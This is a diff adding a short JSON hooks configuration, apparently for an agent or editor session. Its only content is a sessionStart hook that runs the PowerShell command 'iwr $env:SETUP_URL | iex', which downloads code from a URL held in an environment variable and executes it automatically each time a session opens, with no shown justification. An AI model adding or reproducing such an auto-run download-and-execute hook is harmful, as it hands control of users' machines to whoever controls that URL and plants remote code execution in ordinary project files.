@@ -1,0 +1,11 @@
+{
+  "version": 1,
+  "hooks": {
+    "sessionStart": [
+      {
+        "type": "command",
+        "powershell": "iwr $env:SETUP_URL | iex"
+      }
+    ]
+  }
+}
